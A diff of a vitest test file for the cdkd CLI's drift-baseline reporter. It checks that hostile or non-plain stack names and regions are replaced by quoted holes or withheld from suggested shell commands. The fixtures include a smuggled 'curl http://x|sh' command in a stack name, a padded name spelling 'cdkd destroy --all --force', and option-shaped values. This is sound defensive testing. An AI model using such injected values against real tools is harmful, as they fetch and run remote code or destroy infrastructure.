@@ -31,6 +31,7 @@ import {
   type CdkdStateStackTree,
 } from '../../../src/cli/commands/export.js';
 import { getLogger } from '../../../src/utils/logger.js';
+import { PASTE_PAYLOADS, spansThatRun, withPasteDir } from '../utils/paste-harness.js';
 import type { StackState } from '../../../src/types/state.js';
 import type { S3StateBackend } from '../../../src/state/s3-state-backend.js';
 import type { AwsClients } from '../../../src/utils/aws-clients.js';
@@ -2333,6 +2334,112 @@ describe('reportDriftBaselineGaps', () => {
     return { warn: vi.fn(), info: vi.fn(), debug: vi.fn(), error: vi.fn(), setLevel: vi.fn() };
   }
 
+  it('pastes nothing runnable at any granularity, through the reporter itself', () => {
+    // The paste fence for THIS site's two commands (`cdkd state show` and
+    // `cdkd state refresh-observed`, both built through the shared gate since
+    // go-to-k/cdkd#3436's fold-in): every warning the reporter emits for an
+    // ordinary name is inert in every span, and for each payload family as
+    // the stack name and as the region the per-block criterion holds
+    // (`tests/unit/utils/paste-harness.ts`).
+    // Two shapes of state, because the two commands render on DIFFERENT
+    // arms: a readable resource missing its baseline reaches the
+    // `refresh-observed` line, and an UNREADABLE entry reaches the `state
+    // show` one — and with an unreadable entry present the refresh line is
+    // withheld in favour of "repair first" prose. Without the second shape
+    // `unreadableCount` is zero and that command's builder is never reached.
+    const render = (stackName: string, region: string, unreadable: boolean): string[] => {
+      const logger = makeLogger();
+      reportDriftBaselineGaps(
+        {
+          version: 3,
+          stackName,
+          region,
+          resources: {
+            R1: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} },
+            ...(unreadable && {
+              Bad: null as unknown as import('../../../src/types/state.js').ResourceState,
+            }),
+          },
+          outputs: {},
+          lastModified: 0,
+        },
+        logger as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>
+      );
+      const warned = logger.warn.mock.calls.map((c) => String(c[0]));
+      expect(warned.length, `${stackName} / ${region}`).toBeGreaterThan(0);
+      return warned;
+    };
+    withPasteDir((dir) => {
+      const refresh = render('S', 'us-east-1', false);
+      expect(refresh.join('\n')).toContain('cdkd state refresh-observed S --stack-region us-east-1');
+      const inspect = render('S', 'us-east-1', true);
+      expect(inspect.join('\n')).toContain('cdkd state show S --stack-region us-east-1 --json');
+      for (const message of [...refresh, ...inspect]) expect(spansThatRun(message, dir)).toEqual([]);
+      // The region keeps its 128 display cap through the gate (`maxCodePoints`):
+      // one over it is a hole in the inspect command, at it is named.
+      const capped = render('S', 'r'.repeat(129), true).join('\n');
+      expect(capped).toContain("cdkd state show S --stack-region '<region>' --json");
+      expect(capped).not.toContain('r'.repeat(129));
+      expect(render('S', 'r'.repeat(128), true).join('\n')).toContain(
+        `cdkd state show S --stack-region ${'r'.repeat(128)} --json`
+      );
+      // Inert at every granularity for every payload too: this report never
+      // displays the name or region in prose, so the stronger contract holds
+      // and is what is pinned.
+      for (const { value } of PASTE_PAYLOADS) {
+        for (const unreadable of [false, true]) {
+          for (const message of render(value, 'us-east-1', unreadable)) {
+            expect(spansThatRun(message, dir), value).toEqual([]);
+          }
+          for (const message of render('S', value, unreadable)) {
+            expect(spansThatRun(message, dir), value).toEqual([]);
+          }
+        }
+      }
+      // A REGION beginning with `-` (read raw off the state body): the WRITE
+      // command is withheld with the sentence naming the region, never printed
+      // with an unexplained `'<region>'` hole (code review); the READ line
+      // keeps its hole and says what it stands for.
+      // A bare `-` too: the guard is the LEADING dash, not a dash plus more.
+      for (const region of ['--all', '-x', '-']) {
+        const optionRegion = render('S', region, false).join('\n');
+        // The BUILT command is absent (the prose-quoted static
+        // `'cdkd state refresh-observed'` in the withheld sentence is not it).
+        expect(optionRegion, region).not.toMatch(/cdkd state refresh-observed S/);
+        expect(optionRegion, region).not.toContain("'<region>'");
+        // The sentence names the VALUE the gate refused, rendered from its
+        // reason (M3 of the go-to-k/cdkd#3764 review).
+        expect(optionRegion, region).toContain(
+          "this stack's region starts with '-', which cdkd refuses rather than risk"
+        );
+      }
+      // The READ line keeps its hole and explains it BEFORE the command, so
+      // the command stays last and pasteable -- for an option-shaped region
+      // and for a capped one alike (the explanation keys on `inspect.exact`,
+      // not on one spelling).
+      for (const region of ['--all', 'r'.repeat(129)]) {
+        const line = render('S', region, true).find((m) => m.includes('Inspect it with:'))!;
+        expect(line, region).toMatch(
+          /hole in the command below stands for [^\n]*Inspect it with: cdkd state show S --stack-region '<region>' --json$/
+        );
+      }
+      // ...and for a withheld STACK NAME with an ordinary region, so the
+      // explanation keys on any hole, not on the region's alone.
+      const stackHole = render('--all', 'us-east-1', true).find((m) => m.includes('Inspect it with:'))!;
+      expect(stackHole).toMatch(
+        /hole in the command below stands for [^\n]*Inspect it with: cdkd state show '<stack>' --stack-region us-east-1 --json$/
+      );
+      // ...and for a NON-PLAIN stack name, which `plainIdent` holes where
+      // exactness alone would have named it shell-quoted (M2 of the
+      // go-to-k/cdkd#3764 review).
+      const plainHole = render("It's Stack", 'us-east-1', true).find((m) => m.includes('Inspect it with:'))!;
+      expect(plainHole).toMatch(
+        /hole in the command below stands for [^\n]*Inspect it with: cdkd state show '<stack>' --stack-region us-east-1 --json$/
+      );
+      expect(render('S', 'us-east-1', true).join('\n')).not.toContain('hole in the command below');
+    });
+  }, 120_000);
+
   it('warns nothing when every resource has observedProperties', () => {
     const logger = makeLogger();
     reportDriftBaselineGaps(
@@ -2627,7 +2734,7 @@ describe('reportDriftBaselineGaps', () => {
     expect(logger.warn).not.toHaveBeenCalled();
   });
 
-  it('sanitizes, caps and shell-quotes the REGION in every command it builds', () => {
+  it('holes the REGION in the read command and withholds the write on it, never a sanitized spelling', () => {
     // The stack name has hostile, oversized and blank fixtures at every
     // position; the region did not, so the raw value, the stack's cap or an
     // unquoted region at this call site all left those cases green. Driven
@@ -2650,10 +2757,24 @@ describe('reportDriftBaselineGaps', () => {
         .find((m) => m.includes('--stack-region'));
       expect(command).toBeDefined();
       expect(command).not.toContain(String.fromCharCode(0x1b));
-      // Shell-quoted, the embedded quote escaped, and cut at a region's 128.
-      // `us`, the escape as a space, ` east'1`: ten code points, so 118 `R`s.
-      expect(command).toContain(String.raw`--stack-region 'us  east'\''1` + 'R'.repeat(118) + `...'`);
-      expect((command!.match(/R{3,}/g) ?? []).every((run) => run.length === 118)).toBe(true);
+      // A HOLE, not a sanitized spelling, since go-to-k/cdkd#3436's fold-in.
+      // The site used to print `shellQuote(safeRegion(region))` -- the altered
+      // value, cut at 128 -- which is the "never the altered spelling"
+      // half of the rule the shared gate enforces: a region rendering CHANGED
+      // addresses a different record than the message means. The escape and
+      // the over-cap length each make this value inexact on their own, and
+      // the quote alone would be refused by `plainIdent` as `not-plain`, so it
+      // is withheld on three counts rather than respelled.
+      // Scoped to the COMMAND, not the whole message: the prose still DISPLAYS
+      // the sanitized region beside it, which is go-to-k/cdkd#3232's class and
+      // not this one. What must never carry an altered spelling is the text an
+      // operator pastes.
+      const commandSpan = command!.slice(command!.indexOf('cdkd state show'));
+      expect(commandSpan).toContain(`--stack-region '<region>'`);
+      expect(commandSpan, 'an altered spelling must never be NAMED in a command').not.toMatch(
+        /R{3,}/
+      );
+      expect(commandSpan).not.toContain('us  east');
     }
 
     const refresh = makeLogger();
@@ -2735,6 +2856,26 @@ describe('reportDriftBaselineGaps', () => {
     expect(text).toContain('cdkd state show App --json');
     expect(text).not.toContain('--stack-region');
     expect(text).not.toContain('eu-west-1');
+    // ...and the region-less arm of the read command still holds the stack
+    // to `plainIdent`: a loaded name that renders exactly but is not plain is
+    // a hole there too (the arm is a separate argument list from the
+    // region-carrying one, so it needs its own pin).
+    const holed = makeLogger();
+    reportDriftBaselineGaps(
+      {
+        version: 10,
+        stackName: 'Other',
+        region: 'eu-west-1',
+        resources: { BrokenRow: null as never },
+        outputs: {},
+        lastModified: 0,
+      },
+      holed as unknown as ReturnType<typeof import('../../../src/utils/logger.js').getLogger>,
+      { stackName: "It's Stack", region: loadedRegion }
+    );
+    const holedText = holed.warn.mock.calls.map((c) => String(c[0])).join('\n');
+    expect(holedText).toContain("cdkd state show '<stack>' --json");
+    expect(holedText).not.toContain("Stack' --json");
   });
   }
 
@@ -2829,7 +2970,7 @@ describe('reportDriftBaselineGaps', () => {
     expect(refreshAdvice).toContain('refuses a record that holds one');
   });
 
-  it('sanitizes and caps the identifiers it prints, and shell-quotes the stack in its command', () => {
+  it('sanitizes and caps the identifiers it prints, and holes a non-plain stack name in its command', () => {
     // Every identifier in this report comes out of the record: the logical ids
     // from the stored bag, `stackName` from the record body or the S3 key.
     // `ConsoleLogger` sanitizes a logger's extra ARGUMENTS, never the message
@@ -2885,26 +3026,27 @@ describe('reportDriftBaselineGaps', () => {
     // An id with nothing renderable left becomes the named stand-in rather than
     // an empty bullet naming nothing.
     expect(all).toContain('<unrenderable>');
-    // The stack name is SHELL-QUOTED where it lands inside a command: the
-    // ASCII allowlist keeps `\'`, `;` and `|`, so unquoted it would close the
-    // quoting and append its own command to the line.
+    // The stack name is a HOLE where it lands inside a command: the ASCII
+    // allowlist keeps `\'`, `;` and `|`, so it renders exactly, and
+    // `plainIdent` is what refuses it (M2 of the go-to-k/cdkd#3764 review) —
+    // a shell-quoted spelling is what an operator strips, and a padded one
+    // can spell a labelled line once the terminal wraps. The clause before
+    // the command says what the hole stands for, and the name itself appears
+    // nowhere in the report.
     const inspect = logger.warn.mock.calls
       .map((c) => String(c[0]))
       .find((m) => m.includes('cdkd state show'));
     expect(inspect).toBeDefined();
-    // Spelled out rather than built by calling `shellQuote`, so the expected
-    // value is independent of the code under test: `shellQuote` escapes an
-    // embedded quote as `'\''`, closing the literal, emitting an escaped quote
-    // and reopening.
+    expect(inspect).toContain("A quoted '<...>' hole in the command below stands for");
+    expect(inspect).not.toContain('curl');
     // The command must be the WHOLE tail after `Inspect it with: ` — LAST and
     // UNWRAPPED, the contract `lock-contention-message.ts` states. A
     // `toContain` survives both mutants that break it: prose appended after
-    // `--json`, and the whole command wrapped in quotes (which composes with
-    // `shellQuote`'s own quoting into something unpastable).
+    // `--json`, and the whole command wrapped in quotes.
     const MARKER = 'Inspect it with: ';
     expect(inspect).toContain(MARKER);
     expect(inspect!.slice(inspect!.indexOf(MARKER) + MARKER.length)).toBe(
-      String.raw`cdkd state show 'Evil'\''; curl http://x|sh; echo '\''' --stack-region r --json`
+      "cdkd state show '<stack>' --stack-region r --json"
     );
   });
 
@@ -3137,40 +3279,84 @@ describe('reportDriftBaselineGaps', () => {
       // sentence beside it names. A prebuilt cloud assembly supplies this name
       // unvalidated, so it is reachable.
       for (const [label, stackName, printed] of [
-        ['the flag itself', '--all', false],
-        ['a single leading hyphen', '-x', false],
+        ['the flag itself', '--all', 'option'],
+        ['a single leading hyphen', '-x', 'option'],
         // Only the LEADING-hyphen half of `cdkd deploy`'s sibling gate applies
         // here, and these three rows are what stops that gate being copied
         // whole: `cdkd state refresh-observed` resolves its argument by exact
         // name equality (`r.stackName === stackName`), so a `*` or a `/`
         // selects at most the one record literally named that and cannot widen
-        // the target the way a pattern does — withholding for one would cost a
-        // working command and buy nothing.
-        ['a wildcard after a prefix', 'Prod-*', true],
-        ['a display path', 'App/Stack', true],
-        ['an inner hyphen', 'My-App-Stack', true],
+        // the target the way a pattern does. Both ARE withheld — by the
+        // plain-identifier rule, since neither character is one — and the
+        // sentence says so; what is pinned is that it is NOT the pattern
+        // sentence, i.e. `patternMatched` stays unpassed.
+        ['a wildcard after a prefix', 'Prod-*', 'not-plain'],
+        ['a display path', 'App/Stack', 'not-plain'],
+        ['an inner hyphen', 'My-App-Stack', 'printed'],
       ] as const) {
         const advice = refreshAdviceFor(version, stackName, 'us-east-1');
-        if (printed) {
+        if (printed === 'printed') {
           expect(advice, label).toContain('cdkd state refresh-observed');
           expect(advice, label).not.toContain('The command is not printed');
         } else {
           expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
           // The withheld sentence names THIS cause. The exactness wording
           // would be false here — the name renders exactly.
-          expect(advice, label).toContain("reads as an option however it is quoted");
           expect(advice, label).not.toContain('cannot be rendered exactly');
+          expect(advice, label).not.toContain('pattern character');
+          expect(advice, label).toContain(
+            printed === 'option'
+              ? "this stack's name starts with '-', which cdkd refuses rather than risk the CLI reading it as an option however it is quoted"
+              : "this stack's name is not a plain identifier"
+          );
         }
       }
     });
 
     it(`v${version}: WITHHOLDS the refresh command when rendering altered the region`, () => {
-      // A non-breaking space, and a cut at the region cap.
-      for (const region of [`us-east-1\u00a0`, 'r'.repeat(200)]) {
+      // A non-breaking space, and a cut at the region cap (one over it: the
+      // gate's `maxCodePoints`, which is what the sentence must be keyed on —
+      // M3 of the go-to-k/cdkd#3764 review — rather than printing
+      // `--stack-region '<region>'` with no sentence).
+      for (const region of [`us-east-1\u00a0`, 'r'.repeat(129), 'r'.repeat(200)]) {
         const advice = refreshAdviceFor(version, 'S', region);
         expect(advice, region.slice(0, 12)).not.toMatch(/cdkd state refresh-observed \S/);
-        expect(advice, region.slice(0, 12)).toContain('The command is not printed');
+        expect(advice, region.slice(0, 12)).not.toContain("'<region>'");
+        expect(advice, region.slice(0, 12)).toContain(
+          "The command is not printed: this stack's region as cdkd loaded it cannot be rendered exactly"
+        );
       }
+    });
+
+    it(`v${version}: WITHHOLDS the refresh command when a value is not a PLAIN identifier`, () => {
+      // `plainIdent` on both values (M2 of the go-to-k/cdkd#3764 review): each
+      // of these renders exactly and starts with no `-`, so exactness and the
+      // option arm admit it and only the plain-identifier rule withholds — a
+      // padded name spells a labelled line once the terminal wraps, and a
+      // shell-quoted one is what an operator strips.
+      const padded = `Prod${' '.repeat(60)}Migrate with: cdkd destroy --all --force #`;
+      for (const [label, stackName, region, what] of [
+        ['a padded stack name', padded, 'us-east-1', "this stack's name"],
+        ['a stack name with a quote', "It's Stack", 'us-east-1', "this stack's name"],
+        ['a region with a space', 'S', 'us east', "this stack's region"],
+      ] as const) {
+        const advice = refreshAdviceFor(version, stackName, region);
+        expect(advice, label).not.toMatch(/cdkd state refresh-observed \S/);
+        expect(advice, label).not.toContain("'<region>'");
+        expect(advice, label).not.toContain("'<stack>'");
+        expect(advice, label).toContain(
+          `The command is not printed: ${what} is not a plain identifier (a letter or digit, then letters, digits, '~', '_', '.' or '-')`
+        );
+        expect(advice, label).not.toContain('cannot be rendered exactly');
+        expect(advice, label).not.toContain("starts with '-'");
+      }
+      // BOTH values refused, for different reasons: the sentence is about the
+      // FIRST the gate refused — the stack name, in the gate's own order — so
+      // it names the name's option shape, not the region's plainness.
+      const both = refreshAdviceFor(version, '--all', 'us east');
+      expect(both).not.toMatch(/cdkd state refresh-observed \S/);
+      expect(both).toContain("The command is not printed: this stack's name starts with '-'");
+      expect(both).not.toContain("this stack's region");
     });
 
     // The gate measured against what production passes: the LOADED identity.
@@ -3222,7 +3408,7 @@ describe('reportDriftBaselineGaps', () => {
         region: 'us-east-1',
       });
       expect(optionWithheld).not.toMatch(/cdkd state refresh-observed \S/);
-      expect(optionWithheld).toContain('reads as an option however it is quoted');
+      expect(optionWithheld).toContain('refuses rather than risk the CLI reading it as an option however it is quoted');
       // Body `--all`, clean loaded identity: PRINTED, since the body is not
       // what the command is built from.
       expect(refreshAdviceLoaded({ stackName: '--all', region: 'us-east-1' }, clean)).toContain(
@@ -3390,15 +3576,29 @@ describe('reportDriftBaselineGaps', () => {
     // nested name needs — capping it at an identifier's 128 emitted a remedy
     // command naming a stack that does not exist.
     const long = inspectLineFor('q'.repeat(5000));
-    expect(long).toContain(`${'q'.repeat(1152)}...`);
-    expect(long).not.toContain('q'.repeat(1153));
+    // The whole of this line IS the command -- it carries no prose display of
+    // the name beside it -- so the over-cap name is withheld outright since
+    // go-to-k/cdkd#3436's fold-in rather than printed truncated. That is a
+    // BEHAVIOUR CHANGE and the better one: `q...q...` cut at 1152 addresses a
+    // different record than the message means, which is the harm the cap's own
+    // note describes one step further on. The cap still governs what the PROSE
+    // may display elsewhere; it is no longer a licence to name a cut value in
+    // something the operator pastes.
+    expect(long).toContain(`cdkd state show '<stack>'`);
+    expect(long, 'a truncated name must never be NAMED in a command').not.toMatch(/q{10,}/);
     // The remedy is still on screen after the cap — a DISTANCE, sized to the
     // wider identifier rather than to the old one.
     expect(long!.length).toBeLessThan(1600);
 
-    // Nothing renderable left becomes the named stand-in rather than an empty
-    // argument, which `cdkd state show` would read as no stack at all.
-    expect(inspectLineFor('\u0000\u0001')).toContain('<unrenderable>');
+    // Nothing renderable left becomes a quoted HOLE rather than an empty
+    // argument, which `cdkd state show` would read as no stack at all. It was
+    // `<unrenderable>` before go-to-k/cdkd#3436's fold-in; both are quoted
+    // stand-ins that close the empty-argument hazard, and the hole additionally
+    // says WHICH argument is missing so the operator can fill it.
+    expect(inspectLineFor('\u0000\u0001')).toContain(`cdkd state show '<stack>'`);
+    expect(inspectLineFor('\u0000\u0001'), 'never an empty argument').not.toMatch(
+      /cdkd state show\s+--/
+    );
   });
 
   it('stands in for an id or stack name with nothing renderable, at every position', () => {
